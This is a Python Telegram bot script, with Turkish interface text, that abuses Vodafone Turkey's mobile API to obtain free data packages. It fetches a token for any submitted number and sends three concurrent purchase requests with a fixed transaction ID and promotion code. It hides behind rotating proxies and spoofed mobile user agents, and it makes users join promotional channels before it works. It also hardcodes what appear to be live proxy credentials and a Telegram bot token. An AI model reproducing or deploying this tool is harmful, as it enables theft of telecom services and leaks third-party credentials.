import sys
import subprocess
import random
import time
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, date

def ensure_packages(packages):
    for pkg, import_name in packages:
        try:
            __import__(import_name)
        except ImportError:
            print(f"[+] {pkg} eksik, kuruluyor...")
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", pkg
            ])

required_packages = [
    ("requests", "requests"),
    ("colorama", "colorama"),
    ("pyTelegramBotAPI", "telebot"),
    ("python-telegram-bot", "telegram"),
]

ensure_packages(required_packages)

print("@Simmurg")
import requests
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logging.getLogger("httpx").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

def log_kullanici(user, numara, durum):
    pass

# Limit dosyası ve fonksiyonlar (değişmedi)
LIMIT_FILE = "numara_limit.json"
DAILY_LIMIT = 3

def load_limits():
    if os.path.exists(LIMIT_FILE):
        with open(LIMIT_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_limits(data):
    with open(LIMIT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def check_and_update_limit(numara):
    today = str(date.today())
    limits = load_limits()
    
    if numara not in limits:
        limits[numara] = {"tarih": today, "sayi": 0}
    
    if limits[numara]["tarih"] != today:
        limits[numara] = {"tarih": today, "sayi": 0}
    
    current_count = limits[numara]["sayi"]
    
    if current_count >= DAILY_LIMIT:
        return False, current_count
    
    return True, current_count

def increment_limit(numara):
    today = str(date.today())
    limits = load_limits()
    
    if numara not in limits or limits[numara]["tarih"] != today:
        limits[numara] = {"tarih": today, "sayi": 0}
    
    limits[numara]["sayi"] += 1
    save_limits(limits)
    print(f"[LIMIT] {numara} için kullanım: {limits[numara]['sayi']}/{DAILY_LIMIT}")

# IP kontrolü
def get_current_ip(proxies):
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies=proxies, timeout=8)
        if r.status_code == 200:
            return r.json().get("ip", "Bilinmiyor")
        return "IP alınamadı"
    except Exception as e:
        return f"Hata: {str(e)}"

# Webshare Rotating Proxy
WEBSHARE_USERNAME = "hwbggroq-rotate"
WEBSHARE_PASSWORD = "dlvkcdekqoom"
WEBSHARE_HOST = "p.webshare.io"
WEBSHARE_PORT = 80

def get_webshare_proxy():
    proxy_url = f"http://{WEBSHARE_USERNAME}:{WEBSHARE_PASSWORD}@{WEBSHARE_HOST}:{WEBSHARE_PORT}"
    return {"http": proxy_url, "https": proxy_url}

# UA rotasyonu listesi (mobil gerçekçi UA'lar)
UA_LIST = [
    "Mozilla/5.0 (Linux; Android 13; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
]

def get_random_ua():
    return random.choice(UA_LIST)

# Kanallar (değişmedi)
KANAL1_CHAT_ID = -1001590250422
KANAL2_CHAT_ID = -1003199056942
KANAL1_LINK = "https://t.me/+wMnf9vcnNJ9jZDM0"
KANAL2_LINK = "https://t.me/vipinternetkanal"

async def is_subscribed(bot, user_id):
    channels = [KANAL1_CHAT_ID, KANAL2_CHAT_ID]
    for channel in channels:
        try:
            member = await bot.get_chat_member(chat_id=channel, user_id=user_id)
            status = member.status
            print(f"[ABONE KONTROL] Kanal {channel}: Status = '{status}' | User ID: {user_id}")
            if status in ["member", "administrator", "creator", "owner"]:
                print(f"[ABONE KONTROL] Kanal {channel}: Kabul edildi ({status})")
                continue
            else:
                print(f"[ABONE KONTROL] Kanal {channel}: Reddedildi ({status})")
                return False
        except Exception as e:
            print(f"[ABONE KONTROL HATASI] Kanal {channel}: {str(e)} | User ID: {user_id}")
            return False
    print("[ABONE KONTROL] TÜM KANALLARDA ABONE ONAYLANDI!")
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    print(f"[START] Kullanıcı ID: {user_id} - Abonelik kontrolü başlıyor...")
    
    if not await is_subscribed(context.bot, user_id):
        keyboard = [
            [InlineKeyboardButton("1. Kanal", url=KANAL1_LINK)],
            [InlineKeyboardButton("2. Kanal", url=KANAL2_LINK)],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "Kanallara abone olmalısın bro! 🚫\n\n"
            "İşlem yapabilmek için aşağıdaki kanallara katılman lazım.\n"
            "Katıldıktan sonra tekrar /start yaz.",
            reply_markup=reply_markup
        )
        log_kullanici(user, None, "Abone değil - start engellendi")
        print(f"[START] Abone değil: {user_id}")
        return
    
    await update.message.reply_text(
        " Hoşgeldin 🎩"
        "📱 Vodafone 1gb bot \n\n"
        "Numaranı 5xxxxxxxxx formatında gönder.\n"
        "Örnek: 5432198765"
    )
    print(f"[START] Abone onaylandı: {user_id}")

def buy_pack_thread(public_token, numara, identifier, thread_num):
    proxies = get_webshare_proxy()
    current_ip = get_current_ip(proxies)
    
    print(f"[THREAD {thread_num}] Başladı | IP: {current_ip} | Proxy: {proxies['http']}")
    
    buy_url = 'https://m.vodafone.com.tr/maltgtwaycbu/api'
    buy_params = {
        'method': 'buyKolayPack',
        'publicToken': public_token,
        'transactionId': 'DADBA38725DE9A09CA8156C8CB3E7B4E6444C4A28A3A32BD1A57FB2CCAE86EC828E33B0FE97883D68B187C693BF20A6BE8942A5BE87FE782986A33996B3A7A7775F1C59BA76CB5ADB18C5DE099D65FDF41C1E5C90E8B7D8DE26F5C2FC6276DFF3A46402ACED5B38AEB692430DE2A6234BBEA5A48',  # Sabit bırakıldı, random kaldırıldı
        'reasonCode': '13239',
        'operationType': 'MP',
        'isContractApproved': 'true',
        'binCode': '979239',
        'promotionId': '121',
        'msisdn': numara,
        'institutionId': '2871',
        'identifier': identifier,
    }
    
    # Headers'a UA rotasyonu + ekstra header'lar
    buy_headers = {
        'Accept': 'application/json',
        'Origin': 'https://www.vodafone.com.tr',
        'Referer': 'https://www.vodafone.com.tr/',
        'User-Agent': get_random_ua(),  # Her thread'de farklı UA
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    try:
        start_time = time.time()
        buy_response = requests.post(buy_url, params=buy_params, headers=buy_headers, proxies=proxies, timeout=15)
        duration = round(time.time() - start_time, 2)
        
        status_code = buy_response.status_code
        text_snippet = buy_response.text[:150] + "..." if len(buy_response.text) > 150 else buy_response.text
        
        print(f"[THREAD {thread_num}] Bitti | Status: {status_code} | Süre: {duration}s | Response: {text_snippet}")
        
        if 'DCE-9200048' in buy_response.text:
            return True, "Başarılı (DCE-9200048)"
        else:
            return False, f"Başarısız - {status_code} - {text_snippet}"
            
    except Exception as e:
        print(f"[THREAD {thread_num}] HATA: {str(e)}")
        return False, str(e)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    numara = update.message.text.strip()
    
    if not (numara.startswith('5') and len(numara) == 10 and numara.isdigit()):
        await update.message.reply_text("❌ Geçersiz format! 5xxxxxxxxx şeklinde gönder.")
        return

    limit_ok, current_count = check_and_update_limit(numara)
    if not limit_ok:
        await update.message.reply_text(
            f"Bu numara bugün {DAILY_LIMIT} kez kullanıldı knk!\n"
            f"Yarın tekrar dene . Şu anki kullanım: {current_count}/{DAILY_LIMIT}"
        )
        log_kullanici(user, numara, f"Limit aşıldı ({current_count}/{DAILY_LIMIT})")
        print(f"[LIMIT] {numara} limit aşıldı: {current_count}/{DAILY_LIMIT}")
        return

    log_kullanici(user, numara, f"İşlem Başladı (Kullanım: {current_count+1}/{DAILY_LIMIT})")

    msg = await update.message.reply_text(f"🔄 İşlem yapılıyor... (Günlük kullanım: {current_count+1}/{DAILY_LIMIT})")
    
    try:
        proxies = get_webshare_proxy()
        test_ip = get_current_ip(proxies)
        print(f"[MAIN] Token isteği öncesi IP: {test_ip}")
        
        # Token alma headers'a UA rotasyonu ekle
        token_headers = {
            'Accept': 'application/json',
            'User-Agent': get_random_ua(),
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
        }
        token_url = f"https://m.vodafone.com.tr/maltgtwaycbu/api?method=getPublicToken&msisdn={numara}&type=3"
        token_response = requests.post(token_url, headers=token_headers, proxies=proxies, timeout=12)
        
        print(f"[MAIN] Token Status: {token_response.status_code}")
        token_data = token_response.json()
        public_token = token_data.get('publicToken')
        
        if not public_token:
            await msg.edit_text("❌ Token alınamadı Sadece vf faturasız")
            log_kullanici(user, numara, "Token Alınamadı Sadece vf faturasız")
            increment_limit(numara)
            return
        
        # Paket sorgu headers'a UA rotasyonu ekle
        pack_headers = {
            'Accept': 'application/json',
            'User-Agent': get_random_ua(),
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
        }
        pack_url = 'https://m.vodafone.com.tr/maltgtwaycbu/api'
        pack_params = {'method': 'getKolayPacks', 'publicToken': public_token}
        pack_response = requests.post(pack_url, params=pack_params, headers=pack_headers, proxies=proxies)
        
        print(f"[MAIN] Paket sorgu Status: {pack_response.status_code}")
        pack_data = pack_response.json()
        
        identifier = None
        categories = pack_data.get('kolayPackCategory', [])
        for category in categories:
            packs = category.get('kolayPacks', [])
            if packs:
                identifier = packs[0].get('id')
                break
        
        if not identifier:
            await msg.edit_text("❌ Paket bulunamadı")
            log_kullanici(user, numara, "Paket Bulunamadı")
            increment_limit(numara)
            return
        
        await msg.edit_text("🔥 3  istek atılıyor........")
        
        results = []
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(buy_pack_thread, public_token, numara, identifier, i+1)
                for i in range(3)
            ]
            for future in as_completed(futures):
                success, msg_text = future.result()
                results.append((success, msg_text))
        
        basarili = sum(1 for s, _ in results if s)
        detay = "\n".join([f"İstek {i+1}: {'✓ Başarılı' if s else f'✗ {m}'}" for i, (s, m) in enumerate(results)])
        
        if basarili > 0:
            reply = f"✅ {basarili}/3 başarılı!\nDetay:\n{detay}\nGelen paketi kontrol et knk, Kanalımızı Takipte Kal✓"
            log_kullanici(user, numara, f"BAŞARILI ({basarili}/3)")
        else:
            reply = f"❌ Hiçbiri başarılı olmadı\nDetay:\n{detay}"
            log_kullanici(user, numara, "Başarısız (0/3)")
        
        await msg.edit_text(reply)
        
        increment_limit(numara)
        
    except Exception as e:
        await msg.edit_text("⚠️ İşlem tamamlanmadı (hata) geliştiriciye bildirildi ")
        log_kullanici(user, numara, f"Hata: {str(e)}")
        print(f"[GENEL HATA]")
        increment_limit(numara)

def main():
    TOKEN = "8023522413:AAFrtBqHg9OHW1WRkZa3eqvIPBQyRCSkuuA"
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("Bot başlatılıyor... API headers güncellendi.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()